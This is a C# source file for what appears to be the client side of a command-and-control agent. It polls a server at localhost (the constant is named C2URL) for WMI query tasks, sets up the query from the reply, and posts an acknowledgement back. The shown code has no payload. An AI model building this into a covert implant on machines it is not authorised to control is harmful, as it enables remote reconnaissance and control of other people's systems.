using System;
using System.Collections.Generic;
using System.Text;
using System.Runtime;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Threading.Tasks;
using Newtonsoft.Json;

namespace WMInteraction
{
    class HTTPClient
    {
        public static string C2URL = "http://localhost:8090/";

        static HttpClient client = new HttpClient();
        private string id;
        private string ipAddress;
        private string username;
        private string os;
        private string uri;
        private Status clientStatus;

        public HTTPClient(string id, string ipAddress, string username, string os, string uri)
        {
            this.id = id;
            this.ipAddress = ipAddress;
            this.username = username;
            this.os = os;
            this.uri = uri;
        }

        public string Uri
        {
            get { return uri; }
            set { uri = value; }
        }

        public Status ClientStatus
        {
            get { return clientStatus; }
            set { clientStatus = value; }
        }

        static async Task<string> GetStatusAsync(string path)
        {
            string status = null;
            HttpResponseMessage response = await client.GetAsync(path);
            if (response.IsSuccessStatusCode)
            {
                status = await response.Content.ReadAsStringAsync();
            }
            return status;
        }

        public async Task<string> PostAsync(HTTPClient httpClient, HttpContent c)
        {
            var response = string.Empty;

            HttpResponseMessage result = await client.PostAsync(httpClient.uri, c);

            if (result.IsSuccessStatusCode)
            {
                response = result.StatusCode.ToString();
            }
            return response;
        }

        public static async Task RunAsync(WMI_component wmi_component, HTTPClient httpClient)
        {
            client.BaseAddress = new Uri(C2URL);
            client.DefaultRequestHeaders.Accept.Clear();
            client.DefaultRequestHeaders.Accept.Add(
                new MediaTypeWithQualityHeaderValue("application/json"));

            try
            {
                string jsonStatus = await GetStatusAsync(httpClient.uri);
                dynamic DynamicData = JsonConvert.DeserializeObject(jsonStatus);

                int lastIndex = DynamicData.Count - 1;

                wmi_component.WmiAttributes = "*";
                wmi_component.WmiActionId = DynamicData[lastIndex]["id"];
                wmi_component.WmiClass = DynamicData[lastIndex]["wmi_class"];
                wmi_component.Scope = DynamicData[lastIndex]["wmi_scope"];
                wmi_component.Query = new Query(wmi_component.Scope, wmi_component.WmiAttributes, wmi_component.WmiClass);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }

        public static async Task DeleteCommand(WMI_component wmi_component, HTTPClient httpClient)
        {
            client.BaseAddress = new Uri(C2URL);
            client.DefaultRequestHeaders.Accept.Clear();
            client.DefaultRequestHeaders.Accept.Add(
                new MediaTypeWithQualityHeaderValue("application/json"));

            try
            {
                var payload = "{\"client_id\": " + httpClient.id + ",\"wmi_action_id\": \"" + wmi_component.WmiActionId + "\"}";
                var values = new Dictionary<string, string>
                  {
                      { "client_id", httpClient.id },
                      { "wmi_action_id", wmi_component.WmiActionId }
                  };

                var content = new FormUrlEncodedContent(values);

                // Post to the endpoint
                var response = await client.PostAsync(httpClient.uri, content);

                Console.WriteLine(response.StatusCode);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }

        }
    }
}
